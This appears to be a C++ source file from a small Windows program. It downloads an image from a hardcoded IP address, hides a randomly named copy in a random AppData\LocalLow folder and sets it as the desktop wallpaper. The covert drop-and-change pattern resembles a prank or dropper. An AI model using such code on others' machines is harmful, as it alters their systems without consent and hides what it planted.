#include "filesystem.h"

bool FS::F_WriteFile(std::string directory)
{

    std::fstream fp;
    fp.open(GetExePath() + "\\path.txt", std::ios_base::out);

    if (!fp.is_open()) {
        _log.AddLog("couldn't create a new file, so the location is: %s\n", directory.c_str());
        return false;
    }
    fp << "contents dropped to:\n";
    fp << directory;

    fp.close();

    return true;
}

void FS::F_Main(std::string* PATH, bool* var)
{
    //return;
    *var = !*var;
    srand(time(NULL));
    std::string url = "http://16.171.1.238/paska.jpg";
    std::string dst = GetExePath()+"\\paska.jpg";

    if (!F_DownloadFile(url, dst)) {
        _log.AddLog("cannot download file.. aborting\n");
        system("pause");
        return;
    }
    _log.AddLog("file downloaded\n");
    
    std::string random_file_name;
    CreateRandomString(rand() % 20, &random_file_name);

    

    std::string filepath = GetExePath() + "\\paska.jpg";
    std::string randompath = GetExePath() + '\\' + random_file_name + ".jpg";
    
    F_CopyFile(filepath, randompath);

    std::string appdataRoaming;
    F_GetAppDataRoaming(&appdataRoaming);

    GoToPreviousDirectory(&appdataRoaming);

    std::string localLow = appdataRoaming + "LocalLow\\";

    

    std::string thispath;
    std::string path = "C:\\";
    GetRandomDirectory(&thispath, localLow);
    thispath += '\\' + random_file_name + ".jpg";

    //std::cout << "directory: " << thispath << '\n';

    if (!FS::F_WriteFile(thispath)) {
        _log.AddLog("ERROR: couldn't open file '%s'\n", thispath.c_str());
        remove(filepath.c_str());
        remove(randompath.c_str());
        system("pause");
        return;
    }
   // printf("randompath: %s\ndst: %s\n", randompath.c_str(), thispath.c_str());
    F_CopyFile(randompath, thispath);
    
    remove(filepath.c_str());
    remove(randompath.c_str());

    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)thispath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    //remove(thispath.c_str());

    *PATH = thispath;
}